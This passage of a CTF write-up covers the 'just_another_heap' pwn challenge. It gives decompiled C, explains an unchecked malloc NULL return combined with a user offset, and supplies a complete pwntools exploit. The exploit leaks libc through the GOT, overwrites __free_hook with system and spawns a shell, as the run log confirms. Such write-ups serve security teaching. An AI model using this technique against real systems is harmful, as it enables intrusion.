</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">char</span> <span class="no">is_recent</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="c1">; // [rsp+36h] [rbp-1Ah] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">unsigned</span> <span class="no">__int64</span> <span class="no">v12</span><span class="c1">; // [rsp+38h] [rbp-18h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">v12</span> <span class="err">=</span> <span class="no">__readfsqword</span><span class="p">(</span><span class="mi">0x28u</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">if</span> <span class="p">(</span> <span class="no">dword_6020C0</span> <span class="err">&gt;</span> <span class="mi">9</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="err">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="err">&#34;</span><span class="no">You</span> <span class="no">already</span> <span class="no">have</span> <span class="no">to</span> <span class="no">many</span> <span class="no">memories</span> <span class="no">stored</span> <span class="no">in</span> <span class="no">here.</span> <span class="no">You</span> <span class="no">don</span><span class="err">&#39;</span><span class="no">t</span> <span class="no">want</span> <span class="no">another</span> <span class="no">one.</span><span class="err">&#34;</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="err">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">else</span>
</span></span><span class="line"><span class="cl">  <span class="err">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">important</span> <span class="err">=</span> <span class="mi">0</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">recent</span> <span class="err">=</span> <span class="mi">0</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">idx</span> <span class="err">=</span> <span class="mi">0</span><span class="no">LL</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="err">&#34;</span><span class="no">at</span> <span class="no">what</span> <span class="no">page</span> <span class="no">would</span> <span class="no">you</span> <span class="no">like</span> <span class="no">to</span> <span class="no">write</span><span class="err">?&#34;</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">read_long</span><span class="p">((</span><span class="no">__int64</span><span class="p">)</span><span class="err">&amp;</span><span class="no">idx</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">if</span> <span class="p">(</span> <span class="no">heap_list</span><span class="p">[</span><span class="no">idx</span><span class="p">]</span> <span class="err">||</span> <span class="no">idx</span> <span class="err">&gt;</span> <span class="mi">9</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="err">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="err">&#34;</span><span class="no">there</span> <span class="no">is</span> <span class="no">already</span> <span class="no">something</span> <span class="no">written</span> <span class="no">at</span> <span class="no">that</span> <span class="no">page.</span><span class="err">&#34;</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="err">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">else</span>
</span></span><span class="line"><span class="cl">    <span class="err">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="err">&#34;</span><span class="no">name</span><span class="p">:</span><span class="err">&#34;</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">v0</span> <span class="err">=</span> <span class="no">idx</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">struct_list</span><span class="p">[</span><span class="no">v0</span><span class="p">]</span> <span class="err">=</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">0x20uLL</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">read_data</span><span class="p">((</span><span class="no">char</span> <span class="p">*)</span><span class="no">struct_list</span><span class="p">[</span><span class="no">idx</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">name</span> <span class="err">=</span> <span class="p">(</span><span class="no">const</span> <span class="no">char</span> <span class="p">*)</span><span class="no">struct_list</span><span class="p">[</span><span class="no">idx</span><span class="p">]</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">name</span><span class="p">[</span><span class="no">strcspn</span><span class="p">(</span><span class="no">name</span><span class="p">,</span> <span class="err">&#34;\</span><span class="no">n</span><span class="err">&#34;</span><span class="p">)]</span> <span class="err">=</span> <span class="mi">0</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">puts</span><span class="p">(</span><span class="err">&#34;</span><span class="no">How</span> <span class="no">long</span> <span class="no">is</span> <span class="no">your</span> <span class="no">memory</span><span class="err">&#34;</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">read_long</span><span class="p">((</span><span class="no">__int64</span><span class="p">)</span><span class="err">&amp;</span><span class="no">size</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">chunk</span> <span class="err">=</span> <span class="p">(</span><span class="no">char</span> <span class="p">*)</span><span class="no">malloc</span><span class="p">(</span><span class="no">size</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">puts</span><span class="p">(</span><span class="err">&#34;</span><span class="no">Sometimes</span> <span class="no">our</span> <span class="no">memories</span> <span class="no">fade</span> <span class="no">and</span> <span class="no">we</span> <span class="no">only</span> <span class="no">remember</span> <span class="no">parts</span> <span class="no">of</span> <span class="no">them.</span><span class="err">&#34;</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">read_long</span><span class="p">((</span><span class="no">__int64</span><span class="p">)</span><span class="err">&amp;</span><span class="no">offset</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">puts</span><span class="p">(</span><span class="err">&#34;</span><span class="no">Would</span> <span class="no">you</span> <span class="no">like</span> <span class="no">to</span> <span class="no">leave</span> <span class="no">some</span> <span class="no">space</span> <span class="no">at</span> <span class="no">the</span> <span class="no">beginning</span> <span class="no">in</span> <span class="no">case</span> <span class="no">you</span> <span class="no">remember</span> <span class="no">later</span><span class="err">?&#34;</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">if</span> <span class="p">(</span> <span class="no">offset</span> <span class="err">&lt;=</span> <span class="no">size</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="err">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">if</span> <span class="p">(</span> <span class="no">chunk</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="err">{</span>
</span></span><span class="line"><span class="cl">          <span class="nf">for</span> <span class="p">(</span> <span class="no">i</span> <span class="err">=</span> <span class="mi">0</span><span class="c1">; i &lt; offset; ++i )
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nf">chunk</span><span class="p">[</span><span class="no">i</span><span class="p">]</span> <span class="err">=</span> <span class="mi">95</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="err">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">chunk</span> <span class="err">+=</span> <span class="no">offset</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">fflush</span><span class="p">(</span><span class="no">stdin</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">puts</span><span class="p">(</span><span class="err">&#34;</span><span class="no">What</span> <span class="no">would</span> <span class="no">you</span> <span class="no">like</span> <span class="no">to</span> <span class="no">write</span><span class="err">&#34;</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">read_data</span><span class="p">(</span><span class="no">chunk</span><span class="p">,</span> <span class="no">size</span> <span class="p">-</span> <span class="no">offset</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">puts</span><span class="p">(</span><span class="err">&#34;</span><span class="no">Would</span> <span class="no">you</span> <span class="no">say</span> <span class="no">this</span> <span class="no">memory</span> <span class="no">is</span> <span class="no">important</span> <span class="no">to</span> <span class="no">you</span><span class="err">?</span> <span class="p">[</span><span class="no">Y</span><span class="err">/</span><span class="no">N</span><span class="p">]</span><span class="err">&#34;</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">read_data</span><span class="p">(</span><span class="no">is_important</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">if</span> <span class="p">(</span> <span class="no">is_important</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="err">==</span> <span class="mi">89</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="nf">important</span> <span class="err">=</span> <span class="mi">1</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">_IO_getc</span><span class="p">(</span><span class="no">stdin</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">puts</span><span class="p">(</span><span class="err">&#34;</span><span class="no">Would</span> <span class="no">you</span> <span class="no">say</span> <span class="no">this</span> <span class="no">memory</span> <span class="no">was</span> <span class="no">recent</span><span class="err">?</span> <span class="p">[</span><span class="no">Y</span><span class="err">/</span><span class="no">N</span><span class="p">]</span><span class="err">&#34;</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">read_data</span><span class="p">(</span><span class="no">is_recent</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">if</span> <span class="p">(</span> <span class="no">is_recent</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="err">==</span> <span class="mi">89</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="nf">recent</span> <span class="err">=</span> <span class="mi">1</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">heap_list</span><span class="p">[</span><span class="no">idx</span><span class="p">]</span> <span class="err">=</span> <span class="no">chunk</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">recent_list</span><span class="p">[</span><span class="no">idx</span><span class="p">]</span> <span class="err">=</span> <span class="no">recent</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">important_list</span><span class="p">[</span><span class="no">idx</span><span class="p">]</span> <span class="err">=</span> <span class="no">important</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">offset_list</span><span class="p">[</span><span class="no">idx</span><span class="p">]</span> <span class="err">=</span> <span class="no">offset</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">size_list</span><span class="p">[</span><span class="no">idx</span><span class="p">]</span> <span class="err">=</span> <span class="no">size</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="err">++</span><span class="nf">dword_6020C0</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">puts</span><span class="p">(</span><span class="err">&#34;</span><span class="no">Memory</span> <span class="no">created</span> <span class="no">successfully</span><span class="err">\</span><span class="no">n</span><span class="err">&#34;</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">puts</span><span class="p">(</span><span class="no">byte_401786</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">fflush</span><span class="p">(</span><span class="no">stdin</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="err">}</span>
</span></span><span class="line"><span class="cl">      <span class="nf">else</span>
</span></span><span class="line"><span class="cl">      <span class="err">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="err">&#34;</span><span class="no">Invalid</span> <span class="no">offset</span><span class="err">&#34;</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="err">}</span>
</span></span><span class="line"><span class="cl">    <span class="err">}</span>
</span></span><span class="line"><span class="cl">  <span class="err">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">return</span> <span class="no">__readfsqword</span><span class="p">(</span><span class="mi">0x28u</span><span class="p">)</span> <span class="err">^</span> <span class="no">v12</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">}</span>
</span></span></code></pre></div><p>The vulnerability was that the program doesn’t check whether the pointer returned by the malloc is valid or not, the program also allow us to enter a, kind of, offset which will be added to the pointer returned by the malloc, since there’s no check for invalid/NULL return value from the malloc, we can exploit this one by giving a large size of the malloc which will return NULL, then we can give the address of the global array which stores the name pointer, what we will exactly do here is explained as follows:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./just_another_heap&#34;</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#p = process(&#34;./just_another_heap&#34;, env={&#34;LD_PRELOAD&#34;: &#34;./libc.so.6&#34;})</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;dctf-chall-just-another-heap.westeurope.azurecontainer.io&#34;</span><span class="p">,</span> <span class="mi">7481</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">empty</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">important</span><span class="p">,</span> <span class="n">recent</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Exit</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;name:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;memory</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;them.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">empty</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;write</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">important</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;Y&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;N&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">recent</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;Y&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;N&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">forget</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Exit</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;forget?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_list</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Exit</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;5&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>With the wrapper functions, we select the address where the very last name would be stored, which in our case is 0x6022a8</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">memory_ptr_last_idx</span> <span class="o">=</span> <span class="mh">0x6022a8</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&#34;puts&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">huge</span> <span class="o">=</span> <span class="mh">0xFFFF0FFFFFFF</span>
</span></span></code></pre></div><p>Then, we firstly create a chunk which will act as a decoy for performing rest of the exploit, we create this chunk, making the 0x6022a8 will point to the BBBBBBBBBBBBBBBB. We will also create a chunk with the name being /bin/sh\x00</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0xF</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;B&#34;</span><span class="o">*</span><span class="mh">0xF</span><span class="p">,</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0xF</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span>
</span></span></code></pre></div><p>Now, we will force the malloc to return NULL then make the offset to the pointer of the last chunk[9] which we overwrite with GOT address of the puts, giving us a LIBC leak.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0xF</span><span class="p">,</span> <span class="n">memory_ptr_last_idx</span> <span class="o">+</span> <span class="p">(</span><span class="n">huge</span> <span class="o">-</span> <span class="n">memory_ptr_last_idx</span><span class="p">),</span> <span class="n">memory_ptr_last_idx</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">_list</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;9: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="n">byteorder</span><span class="o">=</span><span class="s2">&#34;little&#34;</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFF</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;puts&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;system&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;__free_hook&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Libc base @ &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
</span></span></code></pre></div><p>Now, doing the same, but this time we will force the malloc to again return the NULL and make the offset value to the address of the __free_hook.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0xF</span><span class="p">,</span> <span class="n">free_hook</span> <span class="o">+</span> <span class="p">(</span><span class="n">huge</span> <span class="o">-</span> <span class="n">free_hook</span><span class="p">),</span> <span class="n">free_hook</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span>
</span></span></code></pre></div><p>Now, we just free the chunk 2 which had the /bin/sh string stored resulting in system(&quot;/bin/sh&quot;):-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">forget</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><p>Run the exploit:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">vagrant@ubuntu-bionic:</span><span class="err">~/</span><span class="nf">sharedFolder</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">ductf$</span> <span class="no">python3</span> <span class="no">just_another_heap.py</span> 
</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">vagrant</span><span class="err">/</span><span class="no">sharedFolder</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">ductf</span><span class="err">/</span><span class="no">just_another_heap</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">Canary</span> <span class="no">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">No</span> <span class="no">PIE</span> <span class="p">(</span><span class="mi">0x400000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">home</span><span class="err">/</span><span class="no">vagrant</span><span class="err">/</span><span class="no">sharedFolder</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">ductf</span><span class="err">/</span><span class="no">libc.so.6</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">Canary</span> <span class="no">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">PIE</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">just_another_heap</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">1865</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Libc</span> <span class="no">base</span> <span class="err">@</span> <span class="mi">0x7f83be251000</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">id</span>
</span></span><span class="line"><span class="cl"><span class="nf">uid</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">vagrant</span><span class="p">)</span> <span class="no">gid</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">vagrant</span><span class="p">)</span> <span class="no">groups</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">vagrant</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> 
</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="no">Interrupted</span>
</span></span><span class="line"><span class="cl"><span class="nl">vagrant@ubuntu-bionic:</span><span class="err">~/</span><span class="nf">sharedFolder</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">ductf$</span> 
</span></span></code></pre></div>
      </div>
    </section>
    <footer class="max-w-prose pt-8 print:hidden">
      
  <div class="flex">
    
    
    
    <div class="place-self-center">
      
      
      <div class="text-2xl sm:text-lg">
</div>
    </div>
  </div>


      

      
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
      <div class="flex justify-between pt-3">
        <span>
          
